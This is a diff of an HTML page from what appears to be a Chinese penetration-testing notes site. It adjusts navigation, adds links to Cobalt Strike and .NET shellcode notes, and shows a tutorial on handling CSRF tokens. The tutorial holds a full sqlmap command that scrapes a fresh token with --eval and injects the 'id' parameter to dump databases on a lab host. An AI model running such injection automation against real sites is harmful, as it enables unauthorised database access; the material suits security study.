@@ -118,11 +118,9 @@
             
                 <li class="toctree-l3"><a href="#burpsuite-csrf-token">用Burpsuite 来处理csrf token</a></li>
                 
-            
-                <li class="toctree-l3"><a href="#sqlmap">sqlmap 处理</a></li>
+                    <li><a class="toctree-l4" href="#sqlmap">sqlmap 处理</a></li>
                 
-            
-                <li class="toctree-l3"><a href="#burpsuite">Burpsuite 处理</a></li>
+                    <li><a class="toctree-l4" href="#burpsuite">Burpsuite 处理</a></li>
                 
             
             </ul>
@@ -148,6 +146,28 @@
             
     <li class="toctree-l1 ">
         <a class="" href="../msf_usage/">metasplit使用笔记</a>
+        
+    </li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../cobaltstrike_usage/">cobalt strike 杂记</a>
+        
+    </li>
+
+        
+    </ul>
+<li>
+          
+            <li>
+    <ul class="subnav">
+    <li><span>技巧笔记</span></li>
+
+        
+            
+    <li class="toctree-l1 ">
+        <a class="" href="../.netcallshellcode/">.net 执行 shellcode</a>
         
     </li>
 
@@ -199,16 +219,17 @@
             <div class="section">
               
                 <h1 id="burpsuite-csrf-token">用Burpsuite 来处理csrf token</h1>
+<hr />
 <p>此文章当时发表在wooyun drops里，从邮件里找到了历史。</p>
 <p>问题：http://drops.wooyun.org/tips/2444</p>
-<h1 id="sqlmap">sqlmap 处理</h1>
+<h2 id="sqlmap">sqlmap 处理</h2>
 <p>附加其他案例(--eval): https://gist.github.com/McSimp/2602fd7ee7203e34268b
 当在测试某些网站时我们会遇到token，只能手工或者写工具之后进行自动化处理,就sqlmap和burpsuite而言各有各的方法。</p>
 <pre><code>CGY@Hank-PC /pentest/databases/sqlmap
 $ python sqlmap.py -u &quot;http://192.168.83.117/2.php&quot; --data=&quot;token=123&amp;id=root&quot; --eval=&quot;import urllib2;import re;a=urllib2.build_opener();a.addheaders.append(('Cookie', 'PHPSESSID=72u0q0sem6tbnrqq4bmqs4an05'));token=re.search(r'\w{32}',a.open('http://192.168.83.117/2.php').read()).group(0);print token;&quot; -p id --dbs --cookie=&quot;PHPSESSID=72u0q0sem6tbnrqq4bmqs4an05&quot; --current-user
 </code></pre>
 
-<h1 id="burpsuite">Burpsuite 处理</h1>
+<h2 id="burpsuite">Burpsuite 处理</h2>
 <p>在burpsuite 里提供了一个session handler 机制，可以让我们更好的去自动化处理这些。
 实例代码如下</p>
 <pre><code>&lt;?php
